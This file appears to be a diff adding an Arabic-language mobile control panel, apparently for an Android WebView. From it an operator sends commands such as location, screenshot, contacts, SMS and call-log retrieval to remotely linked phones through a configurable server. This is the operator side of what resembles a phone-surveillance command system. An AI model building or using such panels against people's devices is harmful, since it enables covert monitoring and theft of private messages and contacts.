@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#0f172a">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>أبو الزهراء</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
+            min-height: 100vh;
+            color: white;
+            padding: 16px;
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #334155;
+        }
+        
+        .logo {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #dc2626, #991b1b);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        
+        .title {
+            font-size: 20px;
+            font-weight: bold;
+        }
+        
+        .subtitle {
+            font-size: 12px;
+            color: #94a3b8;
+        }
+        
+        .card {
+            background: rgba(30, 41, 59, 0.5);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid #334155;
+        }
+        
+        .card-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+        
+        .stat-card {
+            background: rgba(15, 23, 42, 0.5);
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 28px;
+            font-weight: bold;
+            color: #dc2626;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #94a3b8;
+        }
+        
+        .device-card {
+            background: rgba(15, 23, 42, 0.5);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .device-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .device-status {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #22c55e;
+        }
+        
+        .device-status.offline {
+            background: #ef4444;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #dc2626, #991b1b);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 8px;
+        }
+        
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #dc2626;
+            color: #dc2626;
+        }
+        
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+        }
+        
+        .action-btn {
+            background: rgba(15, 23, 42, 0.5);
+            border: 1px solid #334155;
+            border-radius: 12px;
+            padding: 12px 8px;
+            color: white;
+            text-align: center;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        
+        .action-btn:active {
+            background: rgba(220, 38, 38, 0.2);
+            border-color: #dc2626;
+        }
+        
+        .action-icon {
+            font-size: 20px;
+            margin-bottom: 4px;
+        }
+        
+        .input-group {
+            margin-bottom: 12px;
+        }
+        
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #94a3b8;
+            margin-bottom: 4px;
+        }
+        
+        .input {
+            width: 100%;
+            background: rgba(15, 23, 42, 0.5);
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 12px;
+            color: white;
+            font-size: 14px;
+        }
+        
+        .server-config {
+            margin-top: 16px;
+        }
+        
+        .loading {
+            display: flex;
+            justify-content: center;
+            padding: 24px;
+        }
+        
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #334155;
+            border-top-color: #dc2626;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">🛡️</div>
+        <div>
+            <div class="title">أبو الزهراء</div>
+            <div class="subtitle">لوحة التحكم المتكاملة v1.0</div>
+        </div>
+    </div>
+    
+    <!-- Server Configuration -->
+    <div id="config-screen" class="card">
+        <div class="card-title">⚙️ إعداد الخادم</div>
+        <div class="input-group">
+            <label>رابط الخادم (Server URL)</label>
+            <input type="url" id="server-url" class="input" placeholder="https://your-server.com">
+        </div>
+        <button class="btn" onclick="connectToServer()">🔗 اتصال</button>
+        <p style="font-size: 12px; color: #94a3b8; margin-top: 8px; text-align: center;">
+            أدخل رابط الخادم للمتابعة
+        </p>
+    </div>
+    
+    <!-- Main Dashboard -->
+    <div id="dashboard" class="hidden">
+        <!-- Stats -->
+        <div class="card">
+            <div class="card-title">📊 الإحصائيات</div>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="devices-count">0</div>
+                    <div class="stat-label">الأجهزة</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="online-count">0</div>
+                    <div class="stat-label">متصل</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="commands-count">0</div>
+                    <div class="stat-label">الأوامر</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="pending-count">0</div>
+                    <div class="stat-label">معلق</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Quick Actions -->
+        <div class="card">
+            <div class="card-title">⚡ إجراءات سريعة</div>
+            <div class="quick-actions">
+                <div class="action-btn" onclick="sendCommand('get_location')">
+                    <div class="action-icon">📍</div>
+                    الموقع
+                </div>
+                <div class="action-btn" onclick="sendCommand('screenshot')">
+                    <div class="action-icon">📷</div>
+                    لقطة
+                </div>
+                <div class="action-btn" onclick="sendCommand('get_battery')">
+                    <div class="action-icon">🔋</div>
+                    البطارية
+                </div>
+                <div class="action-btn" onclick="sendCommand('ring')">
+                    <div class="action-icon">🔔</div>
+                    رنين
+                </div>
+                <div class="action-btn" onclick="sendCommand('get_contacts')">
+                    <div class="action-icon">👥</div>
+                    جهات
+                </div>
+                <div class="action-btn" onclick="sendCommand('get_sms')">
+                    <div class="action-icon">💬</div>
+                    رسائل
+                </div>
+                <div class="action-btn" onclick="sendCommand('get_calls')">
+                    <div class="action-icon">📞</div>
+                    مكالمات
+                </div>
+                <div class="action-btn" onclick="sendCommand('get_info')">
+                    <div class="action-icon">ℹ️</div>
+                    معلومات
+                </div>
+            </div>
+        </div>
+        
+        <!-- Devices List -->
+        <div class="card">
+            <div class="card-title">📱 الأجهزة</div>
+            <div id="devices-list">
+                <div class="loading"><div class="spinner"></div></div>
+            </div>
+        </div>
+        
+        <!-- Settings -->
+        <button class="btn btn-outline" onclick="showConfig()">⚙️ إعادة الإعداد</button>
+    </div>
+    
+    <script>
+        let serverUrl = localStorage.getItem('serverUrl') || '';
+        let selectedDevice = null;
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            if (serverUrl) {
+                connectToServer();
+            }
+        });
+        
+        function connectToServer() {
+            const urlInput = document.getElementById('server-url');
+            serverUrl = urlInput ? urlInput.value : serverUrl;
+            
+            if (!serverUrl) {
+                AndroidInterface.showToast('الرجاء إدخال رابط الخادم');
+                return;
+            }
+            
+            // Save URL
+            localStorage.setItem('serverUrl', serverUrl);
+            
+            // Show dashboard
+            document.getElementById('config-screen').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            
+            // Load data
+            loadDashboard();
+            
+            AndroidInterface.showToast('تم الاتصال بنجاح');
+        }
+        
+        async function loadDashboard() {
+            try {
+                // Fetch stats
+                const statsRes = await fetch(serverUrl + '/api/stats');
+                const statsData = await statsRes.json();
+                
+                if (statsData.ok) {
+                    document.getElementById('devices-count').textContent = statsData.stats.devicesTotal || 0;
+                    document.getElementById('online-count').textContent = statsData.stats.devicesOnline || 0;
+                    document.getElementById('commands-count').textContent = statsData.stats.commandsTotal || 0;
+                    document.getElementById('pending-count').textContent = statsData.stats.commandsPending || 0;
+                }
+                
+                // Fetch devices
+                const devicesRes = await fetch(serverUrl + '/api/devices');
+                const devicesData = await devicesRes.json();
+                
+                if (devicesData.ok) {
+                    renderDevices(devicesData.devices);
+                    if (devicesData.devices.length > 0) {
+                        selectedDevice = devicesData.devices[0];
+                    }
+                }
+            } catch (error) {
+                AndroidInterface.showToast('خطأ في الاتصال: ' + error.message);
+            }
+        }
+        
+        function renderDevices(devices) {
+            const container = document.getElementById('devices-list');
+            
+            if (devices.length === 0) {
+                container.innerHTML = '<p style="text-align: center; color: #94a3b8;">لا توجد أجهزة مربوطة</p>';
+                return;
+            }
+            
+            container.innerHTML = devices.map(device => `
+                <div class="device-card" onclick="selectDevice('${device.id}')">
+                    <div class="device-info">
+                        <div class="device-status ${device.active ? '' : 'offline'}"></div>
+                        <div>
+                            <div style="font-weight: 500;">${device.name || device.id}</div>
+                            <div style="font-size: 12px; color: #94a3b8;">${device.model || 'غير محدد'}</div>
+                        </div>
+                    </div>
+                    <div style="font-size: 12px; color: #94a3b8;">
+                        🔋 ${device.battery || '-'}%
+                    </div>
+                </div>
+            `).join('');
+        }
+        
+        function selectDevice(deviceId) {
+            selectedDevice = deviceId;
+            AndroidInterface.showToast('تم تحديد الجهاز');
+        }
+        
+        async function sendCommand(command) {
+            if (!selectedDevice) {
+                AndroidInterface.showToast('الرجاء تحديد جهاز أولاً');
+                return;
+            }
+            
+            try {
+                AndroidInterface.showToast('جاري إرسال الأمر...');
+                
+                const res = await fetch(serverUrl + '/api/commands', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        deviceId: selectedDevice,
+                        command: command
+                    })
+                });
+                
+                const data = await res.json();
+                
+                if (data.ok) {
+                    AndroidInterface.showToast('تم إرسال الأمر بنجاح');
+                    AndroidInterface.vibrate(100);
+                } else {
+                    AndroidInterface.showToast('فشل إرسال الأمر');
+                }
+            } catch (error) {
+                AndroidInterface.showToast('خطأ: ' + error.message);
+            }
+        }
+        
+        function showConfig() {
+            document.getElementById('config-screen').classList.remove('hidden');
+            document.getElementById('dashboard').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
